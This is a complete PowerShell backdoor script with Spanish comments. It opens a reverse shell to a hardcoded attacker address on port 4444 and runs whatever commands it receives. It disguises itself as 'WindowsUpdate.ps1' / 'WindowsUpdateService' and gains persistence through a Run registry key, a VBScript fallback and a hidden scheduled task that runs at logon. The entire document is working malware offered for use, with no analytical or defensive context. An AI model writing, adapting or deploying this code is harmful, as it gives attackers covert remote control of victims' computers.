# Backdoor optimizado para Windows
# Configuración
$attackerIP = "192.168.2.36"
$attackerPort = "4444"
$scriptName = "WindowsUpdate.ps1"
$scriptPath = "$env:TEMP\$scriptName"
$serviceName = "WindowsUpdateService"
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Función para establecer conexión
function Connect-Backdoor {
    param($IP, $Port)
    
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        
        [byte[]]$bytes = 0..65535|%{0}
        
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 60
    }
}

# Función para instalar persistencia
function Install-Persistence {
    # Si se ejecuta desde una descarga directa, guardar en TEMP
    if ($MyInvocation.MyCommand.Name -ne $scriptName) {
        try {
            # Obtener el contenido del script actual
            $scriptContent = Get-Content $MyInvocation.MyCommand.Path -Raw
            # Guardar en la ubicación permanente
            Set-Content -Path $scriptPath -Value $scriptContent -Force
        }
        catch {
            # Si no se puede obtener la ruta, usar una versión hardcoded
            $hardcodedScript = @"
# Backdoor optimizado para Windows
# Configuración
`$attackerIP = "192.168.2.36"
`$attackerPort = "4444"
`$scriptName = "WindowsUpdate.ps1"
`$scriptPath = "`$env:TEMP\`$scriptName"
`$serviceName = "WindowsUpdateService"
`$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Función para establecer conexión
function Connect-Backdoor {
    param(`$IP, `$Port)
    
    try {
        `$client = New-Object System.Net.Sockets.TCPClient(`$IP, `$Port)
        `$stream = `$client.GetStream()
        
        [byte[]]`$bytes = 0..65535|%{0}
        
        while ((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0) {
            `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0,`$i)
            `$sendback = (iex `$data 2>&1 | Out-String )
            `$sendback2 = `$sendback + "PS " + (pwd).Path + "> "
            `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2)
            `$stream.Write(`$sendbyte,0,`$sendbyte.Length)
            `$stream.Flush()
        }
        `$client.Close()
    }
    catch {
        Start-Sleep -Seconds 60
    }
}

# Instalar persistencia
try {
    Set-ItemProperty -Path `$regKey -Name `$serviceName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `$scriptPath"
}
catch { }

# Bucle principal
while (`$true) {
    Connect-Backdoor -IP `$attackerIP -Port `$attackerPort
    Start-Sleep -Seconds 60
}
"@
            Set-Content -Path $scriptPath -Value $hardcodedScript -Force
        }
    }
    
    # Instalar persistencia en el registro
    try {
        Set-ItemProperty -Path $regKey -Name $serviceName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
    }
    catch {
        # Si falla, intentar con WScript
        try {
            $vbsPath = "$env:TEMP\update.vbs"
            $vbsContent = "Set objShell = CreateObject(`"WScript.Shell`")`r`nobjShell.Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath`", 0, False"
            Set-Content -Path $vbsPath -Value $vbsContent -Force
            Set-ItemProperty -Path $regKey -Name $serviceName -Value "wscript.exe $vbsPath"
        }
        catch { }
    }
    
    # Crear tarea programada (sin nivel más alto)
    try {
        # Eliminar tarea existente si hay
        Unregister-ScheduledTask -TaskName $serviceName -ErrorAction SilentlyContinue
        
        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
        $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERNAME"
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
        
        Register-ScheduledTask -TaskName $serviceName -Trigger $trigger -Action $action -Settings $settings -Force -User "$env:USERNAME"
    }
    catch {
        # Intentar método alternativo con schtasks
        try {
            schtasks /create /tn $serviceName /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath" /sc onlogon /f
        }
        catch { }
    }
}

# Instalar persistencia
Install-Persistence

# Bucle principal
while ($true) {
    Connect-Backdoor -IP $attackerIP -Port $attackerPort
    Start-Sleep -Seconds 60
}
